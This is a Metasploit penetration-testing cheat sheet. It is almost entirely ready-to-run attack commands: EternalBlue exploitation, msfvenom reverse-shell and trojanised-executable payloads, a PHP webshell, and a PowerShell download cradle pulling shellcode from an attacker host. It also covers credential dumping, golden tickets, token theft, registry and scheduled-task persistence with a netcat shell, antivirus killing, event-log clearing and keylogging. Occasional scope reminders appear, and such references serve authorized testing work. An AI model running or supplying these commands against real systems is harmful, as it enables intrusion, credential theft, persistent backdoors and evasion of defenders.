# Startup

## Overview

Initialize the MSF database before importing scan results or using workspace features.

## Commands

    msfdb init
    msfconsole
    db_status

Database connection failure:
    cat /usr/share/metasploit-framework/config/database.yml
    # align postgres msf user/password with database.yml, then:
    service postgresql restart
    msfdb init
    msfconsole

Slow search warning (deprecated cache):
    db_rebuild_cache

Help:
    help
    <command> -h
    grep -h

## Validation / False Positives

db_status failing at launch blocks db_import and workspace — fix postgres before scanning workflows.
Module paths change between Framework versions — verify with search before scripting resource files.


# Search and Exploit Workflow

## Overview

Find a module, configure target and payload, run exploit. Example uses EternalBlue.

## Commands

Search:
    search <string>
    search ms17
    grep php search payloads
    grep linux search post
    grep -v gather search post/windows

Module selection:
    show exploits
    use exploit/windows/smb/ms17_010_eternalblue
    use <#>                              # from search result number
    show info

Target and payload:
    set rhost <target IP>
    show payloads
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost <attacker IP>
    set lport 443
    show options
    show targets
    exploit

Globals (optional):
    setg lhost <attacker IP>

## Validation / False Positives

EternalBlue succeeding only on unpatched SMBv1 hosts — document KB and patch state.
Wrong payload arch (x86 vs x64) gives silent failure or crash — match show targets output.


# msfvenom

## Overview

Generate standalone payloads and staged shellcode outside msfconsole.

## Commands

    msfvenom -h
    msfvenom --list formats

Template:
    msfvenom -p <payload> LHOST=<attacker IP> LPORT=443 -f <format> -o <output>

Examples:
    msfvenom -p windows/meterpreter/bind_tcp -b '\x00\x0A\x0D\xFF'
    msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
    msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > calc2.exe
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=443 \
        -f exe -a x86_64 --platform windows -o $HOME/evil64.exe
    msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=443 \
        -f raw -e php/base64 -o $HOME/webshell.php

## Validation / False Positives

Badchar detection failing still leaves broken shellcode — test payload in lab before delivery.
Injected executables (-x calc.exe) trigger AV on upload — stage via HTTP or encrypt per engagement rules.


# Sessions and Handler

## Overview

Manage multiple Meterpreter shells and keep handlers running for staged payloads.

## Commands

Sessions:
    sessions -l
    sessions -i <id>
    sessions -k 1-3,6
    # ctrl+z backgrounds current session

Handler (catch reverse payloads):
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost <attacker IP>
    set lport 443
    set ExitOnSession false
    exploit -j -z

## Validation / False Positives

Handler on wrong interface (127.0.0.1 vs tun0) shows session died immediately — confirm LHOST matches callback path.
Duplicate handlers on the same port fail silently — use jobs -l to inspect.


# Meterpreter

## Overview

Interactive post-exploitation shell. Prompt is meterpreter >, not msf >.

## Commands

Core:
    sysinfo
    getuid
    ps
    migrate <PID>
    execute -f cmd.exe -i -H
    shell
    background

Filesystem:
    pwd
    ls
    cd
    cat <file>
    download c:\\boot.ini
    upload <local> c:\\windows\\temp\\
    search -f <file>

Network:
    ipconfig

Process and evasion:
    hashdump
    clearev
    idletime
    resource <file.rc>

## Validation / False Positives

hashdump requires SYSTEM and accessible SAM — fails on modern cred guard without migration.
migrate to wrong arch process crashes session — match x86/x64 to payload.


# Privilege Escalation

## Overview

Escalate from user to SYSTEM inside Meterpreter. See windows-privesc.txt for SharpUp, Seatbelt, and manual paths.

## Commands

In-session:
    getsystem
    getuid

Post modules (set session <id>):
    use post/windows/escalate/getsystem
    run

    use post/multi/recon/local_exploit_suggester
    run

Bypass UAC (new handler on different LPORT):
    use exploit/windows/local/bypassuac
    set session <id>
    set payload windows/meterpreter/reverse_tcp
    set lhost <attacker IP>
    set lport 444
    exploit

Additional local modules to try:
    exploit/windows/local/service_permissions
    exploit/windows/local/trusted_service_path
    exploit/windows/local/ms_ndproxy
    post/windows/escalate/unmarshal_cmd_exec

## Validation / False Positives

getsystem failing on patched Server 2019+ is expected — use exploit_suggester output, not guesswork.
UAC bypass spawns a second session — use a different LPORT and confirm getuid before reporting.


# Enumeration

## Overview

Run gather scripts from an existing Windows session.

## Commands

    run post/windows/gather/enum_domain
    run post/windows/gather/enum_domains
    run post/windows/gather/enum_logged_on_users
    run post/windows/gather/enum_shares
    run post/windows/gather/credentials/gpp
    run killav
    run getcountermeasure
    run winenum

## Validation / False Positives

GPP XML with encrypted passwords still needs the public AES key to decrypt — finding the file is step one.
killav success is ephemeral — document what was stopped and whether it respawned.


# Credentials

## Overview

Dump credentials from Meterpreter via Kiwi (Mimikatz). Full offline handling in windows-credentials.txt.

## Commands

    load kiwi
    help kiwi
    creds_all
    lsa_dump_sam
    lsa_dump_secrets
    dcsync_ntlm krbtgt

Advanced (authorized AD engagements):
    golden_ticket_create -d <domain> -u <user> -s <SID> -k
    kerberos_ticket_use /root/<ticket>

## Validation / False Positives

creds_all empty often means not SYSTEM or no interactive logon — migrate and retry after user activity.
dcsync requires replication rights — failure is not proof DCSync is patched.


# Tokens

## Overview

Impersonate Windows tokens with incognito when you have a session but need another user's context.

## Commands

    use incognito
    list_tokens -u
    impersonate_token <domain>\\<user>
    impersonate_token "NT AUTHORITY\SYSTEM"
    steal_token <PID>
    getuid
    rev2self
    drop_token

## Validation / False Positives

Token list showing a user does not mean impersonation succeeds — confirm getuid change.
rev2self/drop_token before exit to avoid leaving elevated context in session logs.


# Persistence

## Overview

Maintain access after initial compromise. Use only with explicit scope approval.

## Commands

Meterpreter persistence:
    run persistence -X -i 30 -p 443 -r <attacker IP>
    # note cleanup resource path in output

Handler with AutoRunScript:
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost <attacker IP>
    set lport 443
    set ExitOnSession false
    set AutoRunScript persistence -X -i 30 -p 443 -r <attacker IP>
    exploit -j -z

Scheduled (s4u):
    use exploit/windows/local/s4u_persistence
    set session <id>
    set TRIGGER lock
    exploit

Registry run key (example):
    reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run \
        -v netcat -d "c:\\windows\\system32\\nc.exe -ldp 443 -e cmd.exe"

Linux SSH key (handler AutoRunScript):
    set AutoRunScript post/linux/manage/sshkey_persistence

## Validation / False Positives

persistence -X survives reboot but is noisy in autoruns and Defender — pair with cleanup steps in report.
Registry persistence requires admin and survives until key removed — document exact key path.


# Lateral Movement

## Overview

Spread from a compromised host using MSF psexec. See windows-lateral.txt for impacket and RDP.

## Commands

    use exploit/windows/smb/psexec
    set rhost <target IP>
    set smbuser <user>
    set smbpass <password or hash>
    set payload windows/meterpreter/reverse_tcp
    set lhost <attacker IP>
    set lport 443
    exploit

PowerShell shellcode delivery:
    powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://<attacker IP>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -lhost <attacker IP> -lport 443 -Force"

## Validation / False Positives

psexec requires admin on target and SMB reachable — 445 filtered is not a module failure to misconfigure.
Pass-the-hash needs SMBPass in LM:NT or :NT format per module docs.


# Pivoting

## Overview

Route traffic through a session to scan internal subnets.

## Commands

    run post/multi/manage/autoroute
    run arp_scanner -r <subnet>/<cidr>

    use auxiliary/scanner/portscan/tcp
    set rhosts <subnet>/<cidr>
    set ports 445
    set threads 10
    run

## Validation / False Positives

autoroute adding routes does not open new sessions — confirm scans hit rhosts through the pivot session.
arp_scanner noise on large subnets may trip IDS — throttle threads in production.


# Active Directory

## Overview

Enumerate AD and dump hashes from a privileged session. Kerberos attacks and BloodHound in ad-attacks.txt and ad-bloodhound.txt.

## Commands

Gather modules:
    run post/windows/gather/credentials/domain_hashdump
    run post/windows/gather/enum_ad_users
    run post/windows/gather/enum_ad_computers
    run post/windows/gather/enum_ad_groups
    run post/windows/gather/enum_ad_service_principal_names
    run post/windows/gather/enum_domain_users

Manage users:
    use windows/manage/add_user_domain
    set addtodomain true
    set username <user>
    set password <password>
    set session <id>
    exploit

    use windows/manage/delete_user
    set username <user>
    set session <id>
    exploit

## Validation / False Positives

domain_hashdump needs SYSTEM on a DC or DCSync rights — document which path succeeded.
add_user_domain creating Domain Admins membership is destructive — scope only.


# Cross-Platform Delivery

## Overview

Deliver payloads via web_delivery when you have code execution in a script interpreter.

## Commands

Windows (PowerShell):
    use exploit/multi/script/web_delivery
    set lhost <attacker IP>
    set lport 443
    set target 2
    set payload windows/meterpreter/reverse_tcp
    exploit

Linux (Python):
    use exploit/multi/script/web_delivery
    set lhost <attacker IP>
    set lport 443
    set target 0
    set payload python/meterpreter/reverse_tcp
    exploit

## Validation / False Positives

Target must fetch and execute the returned one-liner — blocked egress or constrained language mode breaks delivery.
Python meterpreter is limited compared to Windows — confirm session capabilities before post modules.


# Database

## Overview

Import nmap results, organize engagements by workspace, and query discovered services.

## Commands

Import and export:
    db_import <scan file>
    db_export -f xml <file>

Workspaces:
    workspace -a <name>
    workspace <name>
    workspace -d <name>
    workspace -r <old> <new>

Query:
    hosts
    services
    creds
    loot
    vulns
    services -p 22 --rhosts
    services -s http
    hosts -d <IP>

## Validation / False Positives

db_import without workspace isolation mixes client data — use per-engagement workspaces.
services --rhosts populates RHOSTS globally — verify scope before mass exploit attempts.


# Misc

## Overview

Collection and desktop interaction from Meterpreter. High sensitivity — scope only.

## Commands

    idletime
    keyscan_start
    keyscan_dump
    keyscan_stop
    screenshot
    timestomp
    run vnc
    run screen_unlock
    webcam_list

## Validation / False Positives
